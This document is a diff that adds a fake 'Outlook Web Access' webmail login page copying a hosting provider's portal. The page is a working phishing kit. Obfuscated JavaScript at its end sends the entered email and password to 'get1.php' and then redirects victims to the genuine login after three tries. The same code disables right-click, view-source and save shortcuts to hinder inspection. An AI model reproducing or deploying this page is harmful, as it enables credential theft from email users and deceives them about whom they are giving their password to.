@@ -1,0 +1,145 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Outlook Web Access</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link href="https://controlpanel.serverdata.net/Portal/bundles/styles/login/aduser?v=W7BlBDeKoLwh8af7SGN3zTnaNVVx3_J0LsG11KaUjz81" rel="stylesheet"/>
+
+    <script src="https://controlpanel.serverdata.net/Portal/bundles/scripts/login/form?v=CmdgOWPmbhvy-YqQrxjWVdKbUwAQPUKB8GGJxjDJB141"></script>
+
+    <style>
+        .wbk {
+            word-break: keep-all;
+        }
+        .p0 {
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <section class="login-section">
+        <div class="login-logo"></div>
+        <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
+        
+
+<div class="login-alert" id="login-update-browser-ie" style="display: none">
+    <div class="text-center">
+        <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
+    </div>
+</div>
+
+        <div id="oldBrowser" class="login-alert" style="display: none;">
+            <div class="login-alert-content">
+                
+                <img class="login-alert-icon m-24" src="https://controlpanel.serverdata.net/Content/images/icons/24/warning-orange_24.png" alt="">
+                <div class="login-alert-text"><div class="d-tc">
+ <i class="login-alert-icon-warning mr10 ml-10"></i>
+ </div>
+ <div class="d-tc">
+ <p><strong>You’ll get more if you update your browser.</strong> <br>
+ Our layout and page behavior is optimized for the latest version of your browser.</p>
+ <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
+ <p class="mb0">This button will redirect you to your browser’s
+ update page</p>
+ </div></div>
+            </div>
+        </div>
+                            <div class="login-tabs">
+                
+            </div>
+        <form method="POST" class="login-form" novalidate autocomplete="off">
+            <div>
+                <div id="aduser-login-spinner" style="display: none">
+                    <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
+                        <ui:spinner></ui:spinner>
+                    </div>
+                </div>
+                <input name="returnUrl" type="hidden" value="#" />
+                <input name="clientType" type="hidden" class="client-type" value="WebMail" />
+                <div class="pr">
+                    <input name="login"
+                           id="email"
+                           type="text"
+                           value=""
+                           placeholder="Login (email)"
+                           class="login-input" required autofocus />
+                    <div class="login-validation required">Login required</div>
+                        <div class="login-validation email">Valid email address required</div>
+                </div>
+                <div class="pr">
+                    <input name="password"
+                           id="password"
+                           type="password"
+                           placeholder="Password"
+                           class="password-input" required />
+                    <div class="password-validation required">Password required</div>
+                <div class="mixed-validation" id="msg" style="display: none;">Your login or password is incorrect. </div>
+          <span id="error" class="mixed-validation" style="display: none;"></span> <br>
+                <template id="login-captcha-template">
+                    <div class="login-form-captcha">
+                        <input type="hidden" name="captchaId" value="4bdc44d6c187432482590abd5ba1f87d" />
+                        <div class="captcha-image">
+                            <img id="captchaImage" src="/Portal/Captcha?id=4bdc44d6c187432482590abd5ba1f87d&amp;width=94&amp;height=36&amp;rnd=1752239142&amp;httproute=True" alt="" />
+                        </div>
+                        <button class="captcha-refresh" type="button">
+                            
+                            <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="captcha-refresh-icon">
+                                <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
+                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
+                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
+                                </path>
+                                <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
+                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
+                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
+                                </path>
+                            </svg>
+                            
+                        </button>
+                    </div>
+                    <div class="pr">
+                        <input name="captchaCode" type="text" placeholder="Code" class="captcha-input" autofocus />
+                        <div class="captcha-validation required">Code required</div>
+                        <div class="captcha-validation server">Valid code required</div>
+                    </div>
+                </template>
+                <div id="login-captcha-place" class="pr"></div>
+                <div class="login-actions">
+                    <div class="login-remember">
+                        <label class="login-remember-me">
+                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox" />
+                            <span style="line-height: 22px; height: 22px;">Remember me</span>
+                        </label>
+                    </div>
+                    <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
+                </div>
+            </div>
+            <button type="submit" id="submit-btn" class="login-submit wbk p0">Login</button>
+        </form>
+    </section>
+    <span style="display: none">
+        <!-- GA general tracking -->
+   
+</body>
+
+
+
+
+
+    <!-- Optional JavaScript -->   
+    
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+
+        <script>
+
+
+function _0xaf4f(_0x468b3d,_0x5ba7ec){var _0x51722d=_0x5172();return _0xaf4f=function(_0xaf4f65,_0x17aa39){_0xaf4f65=_0xaf4f65-0x130;var _0x2464c2=_0x51722d[_0xaf4f65];if(_0xaf4f['mwyPqy']===undefined){var _0x1ec0e4=function(_0x56219e){var _0x4761cf='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x35f944='',_0x2a57a1='';for(var _0x30558c=0x0,_0x3a36e4,_0x7e6cd0,_0x37c83a=0x0;_0x7e6cd0=_0x56219e['charAt'](_0x37c83a++);~_0x7e6cd0&&(_0x3a36e4=_0x30558c%0x4?_0x3a36e4*0x40+_0x7e6cd0:_0x7e6cd0,_0x30558c++%0x4)?_0x35f944+=String['fromCharCode'](0xff&_0x3a36e4>>(-0x2*_0x30558c&0x6)):0x0){_0x7e6cd0=_0x4761cf['indexOf'](_0x7e6cd0);}for(var _0x5cb5bb=0x0,_0x77764b=_0x35f944['length'];_0x5cb5bb<_0x77764b;_0x5cb5bb++){_0x2a57a1+='%'+('00'+_0x35f944['charCodeAt'](_0x5cb5bb)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a57a1);};_0xaf4f['yASOVk']=_0x1ec0e4,_0x468b3d=arguments,_0xaf4f['mwyPqy']=!![];}var _0x4aa70b=_0x51722d[0x0],_0x9937b3=_0xaf4f65+_0x4aa70b,_0x298664=_0x468b3d[_0x9937b3];return!_0x298664?(_0x2464c2=_0xaf4f['yASOVk'](_0x2464c2),_0x468b3d[_0x9937b3]=_0x2464c2):_0x2464c2=_0x298664,_0x2464c2;},_0xaf4f(_0x468b3d,_0x5ba7ec);}var _0x8b9e4a=_0xaf4f;(function(_0x4b9635,_0x58ef4e){var _0x2f6b6f=_0xaf4f,_0x2654db=_0x4b9635();while(!![]){try{var _0x265f37=parseInt(_0x2f6b6f(0x139))/0x1*(-parseInt(_0x2f6b6f(0x15b))/0x2)+-parseInt(_0x2f6b6f(0x13f))/0x3*(parseInt(_0x2f6b6f(0x14c))/0x4)+-parseInt(_0x2f6b6f(0x149))/0x5+-parseInt(_0x2f6b6f(0x145))/0x6*(-parseInt(_0x2f6b6f(0x16f))/0x7)+parseInt(_0x2f6b6f('0x166'))/0x8*(-parseInt(_0x2f6b6f('0x14f'))/0x9)+-parseInt(_0x2f6b6f(0x143))/0xa+parseInt(_0x2f6b6f('0x134'))/0xb;if(_0x265f37===_0x58ef4e)break;else _0x2654db['push'](_0x2654db['shift']());}catch(_0x2b7da2){_0x2654db['push'](_0x2654db['shift']());}}}(_0x5172,0x7b537),$(document)['bind']('keydown',function(_0x1b7730){var _0x5cbf3b=_0xaf4f;if(_0x1b7730[_0x5cbf3b(0x141)]&&_0x1b7730['which']==0x53){if(_0x5cbf3b('0x152')===_0x5cbf3b(0x152))return _0x1b7730[_0x5cbf3b(0x13e)](),![];else _0xf77383('#password')[_0x5cbf3b('0x174')](''),_0x34854a>=0x3&&(_0x348912=0x0,_0x34f75a[_0x5cbf3b('0x154')][_0x5cbf3b('0x161')](_0x5cbf3b(0x131)));}}),document[_0x8b9e4a('0x140')]('contextmenu',_0x233da5=>_0x233da5[_0x8b9e4a('0x13e')]()),document[_0x8b9e4a('0x14e')]=function(_0x5e9968){var _0x149707=_0x8b9e4a;return _0x5e9968[_0x149707(0x141)]&&(_0x5e9968[_0x149707('0x170')]===0x43||_0x5e9968[_0x149707('0x170')]===0x56||_0x5e9968[_0x149707('0x170')]===0x55||_0x5e9968[_0x149707(0x170)]===0x75)?_0x149707(0x168)===_0x149707('0x168')?![]:(_0x35058b(_0x149707(0x162))[_0x149707(0x16a)](),_0x1c13a3[_0x149707(0x172)],![]):!![];},$(document)['keypress']('u',function(_0x240cdb){var _0x37641f=_0x8b9e4a;if(_0x240cdb[_0x37641f(0x141)]){if(_0x37641f(0x158)===_0x37641f('0x158'))return![];else _0x367fd5(_0x37641f('0x153'))[_0x37641f(0x13b)](_0x37641f(0x144));}else return'TwzjW'==='CrXyC'?(_0x5cb5bb[_0x37641f(0x13e)](),![]):!![];}),$(document)[_0x8b9e4a(0x159)](function(){var _0x435b17=_0x8b9e4a,_0x56173c=0x0;$(_0x435b17('0x130'))[_0x435b17(0x167)](function(){var _0x3afc54=_0x435b17;_0x3afc54(0x137)===_0x3afc54(0x16c)?(_0x3d8a1c('#msg')[_0x3afc54(0x16a)](),_0x485923[_0x3afc54('0x16b')](_0x28ccbd),_0xf55dac(_0x3afc54('0x14a'))['html'](_0x5b3787['msg']),_0x361c82[_0x3afc54(0x138)]=='ok'?(_0xde8fdf(_0x3afc54('0x135'))['val'](''),_0x5607cc>=0x3&&(_0x5109d6=0x0,_0x168ea3[_0x3afc54('0x154')][_0x3afc54(0x161)](_0x3afc54(0x131)))):_0x336e51(_0x3afc54(0x14a))[_0x3afc54(0x13b)](_0x212ec9[_0x3afc54(0x160)])):($(_0x3afc54(0x14a))[_0x3afc54('0x16e')](),$('#email')['val'](''),$(_0x3afc54(0x171))[_0x3afc54(0x15d)]({'left':0xc8,'opacity':_0x3afc54('0x16e')},0x0),$('#inputbar')[_0x3afc54('0x15d')]({'right':0xc8,'opacity':_0x3afc54('0x16a')},0x3e8));});var _0x587301=window[_0x435b17(0x154)][_0x435b17(0x146)][_0x435b17(0x151)](0x1);if(!_0x587301){}else{var _0x4415e1=_0x587301;$(_0x435b17('0x150'))[_0x435b17(0x174)](_0x4415e1);var _0xff86d8=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0xff86d8[_0x435b17(0x165)](_0x4415e1)){if('vapES'!==_0x435b17(0x13c))_0x1fffdc(_0x435b17('0x14a'))[_0x435b17('0x13b')](_0x2886e8['msg']);else return $(_0x435b17('0x162'))['show'](),_0x587301[_0x435b17(0x172)],![];}var _0x327dd3=_0x4415e1['indexOf']('@'),_0x23dbba=_0x4415e1[_0x435b17(0x151)](_0x327dd3+0x1),_0x59c992=_0x435b17('0x157')+_0x23dbba,_0xa4203f=_0x23dbba;$(_0x435b17('0x15a'))['html'](_0x587301);}$('#submit-btn')[_0x435b17('0x167')](function(_0x2e3b4a){var _0x17b216=_0x435b17;if('KRcCn'==='KRcCn'){_0x2e3b4a['preventDefault'](),$(_0x17b216('0x162'))['hide'](),$(_0x17b216(0x14a))[_0x17b216('0x16e')]();var _0x1975ce=$(_0x17b216(0x150))['val'](),_0x29e725=$('#password')[_0x17b216('0x174')](),_0x504e69=_0x1975ce,_0x24a5cd=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x1975ce){if(_0x17b216(0x142)===_0x17b216('0x142'))return $(_0x17b216(0x162))['show'](),$(_0x17b216('0x162'))[_0x17b216(0x13b)](_0x17b216(0x15f)),![];else _0x101019(_0x17b216(0x135))[_0x17b216(0x174)](''),_0x976840>=0x3&&(_0x2b653e=0x0,_0x150d29['location'][_0x17b216(0x161)](_0x17b216(0x131))),_0x598a5c(_0x17b216('0x14a'))['show']();}if(!_0x24a5cd[_0x17b216(0x165)](_0x504e69))return _0x17b216(0x14b)!==_0x17b216(0x15c)?($(_0x17b216('0x162'))[_0x17b216('0x16a')](),$(_0x17b216('0x162'))[_0x17b216(0x13b)](_0x17b216('0x169')),![]):![];if(!_0x29e725)return'EbMZc'==='EbMZc'?($('#error')['show'](),$(_0x17b216(0x162))[_0x17b216('0x13b')]('<span\x20style=\x27color:black;\x20font-size:15px\x27>Password\x20required</span>'),![]):(_0x1630d0('#error')[_0x17b216('0x16a')](),_0x3ac274('#error')['html'](_0x17b216(0x136)),![]);if(_0x29e725[_0x17b216('0x164')]<0x4){if('yosYi'==='RbmIw')_0x4334f8(_0x17b216(0x153))['html']('LOADING\x20!......');else return $(_0x17b216('0x162'))[_0x17b216(0x16a)](),$(_0x17b216(0x162))[_0x17b216('0x13b')](_0x17b216('0x133')),_0x1975ce[_0x17b216('0x172')],![];}_0x56173c=_0x56173c+0x1,$[_0x17b216('0x13a')]({'dataType':_0x17b216('0x163'),'url':'get1.php','type':'POST','data':{'email':_0x1975ce,'password':_0x29e725},'beforeSend':function(_0x8604d4){$('#submit-btn')['html']('LOADING\x20!......');},'success':function(_0x32e65f){var _0x359427=_0x17b216;if(_0x359427('0x16d')===_0x359427('0x155'))_0x5e807d=0x0,_0x4ec337['location'][_0x359427(0x161)](_0x359427('0x131'));else{$('#msg')[_0x359427(0x13b)](_0x359427('0x132'));if(_0x32e65f){if('zBjIs'===_0x359427('0x147')){if(_0x2a57a1[_0x359427('0x141')]&&_0x30558c[_0x359427(0x173)]==0x53)return _0x7e6cd0['preventDefault'](),![];}else{$(_0x359427(0x14a))[_0x359427('0x16a')](),console['log'](_0x32e65f),$(_0x359427('0x14a'))['html'](_0x32e65f[_0x359427(0x160)]);if(_0x32e65f[_0x359427('0x138')]=='ok')$(_0x359427(0x135))[_0x359427('0x174')](''),_0x56173c>=0x3&&('OKjiY'!=='OKjiY'?(_0x319c71('#msg')['hide'](),_0x17c22b(_0x359427('0x150'))[_0x359427(0x174)](''),_0x3c5009('#automail')[_0x359427('0x15d')]({'left':0xc8,'opacity':_0x359427('0x16e')},0x0),_0x1481e5(_0x359427('0x15e'))[_0x359427('0x15d')]({'right':0xc8,'opacity':'show'},0x3e8)):(_0x56173c=0x0,window[_0x359427(0x154)][_0x359427('0x161')](_0x359427(0x131))));else{if(_0x359427(0x14d)===_0x359427(0x14d))$(_0x359427('0x14a'))[_0x359427('0x13b')](_0x32e65f[_0x359427(0x160)]);else return!![];}}}}},'error':function(){var _0x197b5b=_0x17b216;if(_0x197b5b('0x156')==='cdVxF'){var _0x28f05b=_0x2fdc74;_0x2e6392(_0x197b5b('0x150'))['val'](_0x28f05b);var _0x1cd097=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x1cd097[_0x197b5b(0x165)](_0x28f05b))return _0x148206(_0x197b5b('0x162'))[_0x197b5b(0x16a)](),_0x336b62[_0x197b5b(0x172)],![];var _0x3623d2=_0x28f05b['indexOf']('@'),_0x559288=_0x28f05b[_0x197b5b('0x151')](_0x3623d2+0x1),_0x403861='https://'+_0x559288,_0x20c968=_0x559288;_0x130e71(_0x197b5b('0x15a'))['html'](_0x54157f);}else{$(_0x197b5b('0x135'))[_0x197b5b('0x174')]('');if(_0x56173c>=0x3){if(_0x197b5b('0x148')===_0x197b5b(0x13d))return!![];else _0x56173c=0x0,window[_0x197b5b('0x154')][_0x197b5b('0x161')](_0x197b5b(0x131));}$(_0x197b5b(0x14a))[_0x197b5b(0x16a)]();}},'complete':function(){var _0x4a7c3f=_0x17b216;$(_0x4a7c3f(0x153))['html']('LOGIN');}});}else return _0x3939f6(_0x17b216('0x162'))['show'](),_0x32fa53('#error')[_0x17b216('0x13b')]('<span\x20style=\x27color:black;\x20font-size:15px\x27>That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20valid\x20email\x20address</span>'),![];});}));function _0x5172(){var _0x5291f0=['phnWyw4GC3r5Bgu9j2nVBg9YoNjLzdSGzM9UDc1ZAxPLoJe1ChGNpKvTywLSigfJy291BNqGB3iGugfZC3DVCMqGAxmGAw5JB3jYzwn0lIbqBgvHC2uGDhj5igfNywLUpc9ZCgfUpG','phnWyw4GC3r5Bgu9j2nVBg9YoMjSywnRoYbMB250lxnPEMu6mtvWEcC+qw4GzxjYB3iGB2nJDxjLzcWGAw52ywXPzcbWyxnZD29YzdWVC3bHBJ4','mZaWnJa1ndD0wfjbr2K','i3bHC3n3B3jK','phnWyw4GC3r5Bgu9j2nVBg9YoMjSywnRoYbMB250lxnPEMu6mtvWEcC+ugfZC3DVCMqGCMvXDwLYzwq8l3nWyw4+','EfruEMO','C2LNBMfS','nNDKBgHSEa','ywPHEa','AhrTBa','DMfWrvm','BLLTB0O','ChjLDMvUDerLzMf1Bhq','odyZnZiXvg5gzKvm','ywrKrxzLBNrmAxn0zw5LCG','y3rYBeTLEq','DxvQA1y','nJuZmtK3mfvjuLbNAa','te9hsu4','mJy2mdeZnLvlA2jgAG','AgfZAa','rgXQwfa','vxDZv3O','mtC2ndC1mfv1DuD6CG','i21ZzW','teDNCuq','ogPXz2nMyW','u0HgB2u','B25RzxLKB3DU','mtu3nJCXqxDjAKXQ','i2vTywLS','C3vIC3rY','zvjdD3u','i3n1yM1PDc1IDg4','Bg9JyxrPB24','zhzLChe','tMTlsfm','Ahr0Chm6lY8','ENvZzem','CMvHzhK','lMvTywLS','mtq2otqYzxzhCunT','BgDYzuq','yw5PBwf0zq','i2LUChv0yMfY','phnWyw4GC3r5Bgu9j2nVBg9YoMjSywnRoYbMB250lxnPEMu6mtvWEcC+vMfSAwqGzw1HAwWGywrKCMvZCYbYzxf1AxjLzdWVC3bHBJ4','BxnN','CMvWBgfJzq','i2vYCM9Y','sLnptG','BgvUz3rO','DgvZDa','mJK2rMPRBNzn','y2XPy2S','wfHHqwe','phnWyw4GC3r5Bgu9j2nVBg9YoMjSywnRoYbMB250lxnPEMu6mtvWEcC+vgHHDcbHy2nVDw50igrVzxnUj3qGzxHPC3qUievUDgvYigeGDMfSAwqGzw1HAwWGywrKCMvZCZWVC3bHBJ4','C2HVDW','Bg9N','C1rWtfC','zw1tzKS','AgLKzq','n1DlDw5oCW','A2v5q29Kzq','i2f1Dg9TywLS','zM9JDxm','D2HPy2G','DMfS','i2jHy2SX','Ahr0Chm6lY9JB250CM9SCgfUzwWUC2vYDMvYzgf0ys5UzxqVug9YDgfSl0fevxnLCI9mB2DPBG'];_0x5172=function(){return _0x5291f0;};return _0x5172();}
+
+
+  </script>
+
+</html>
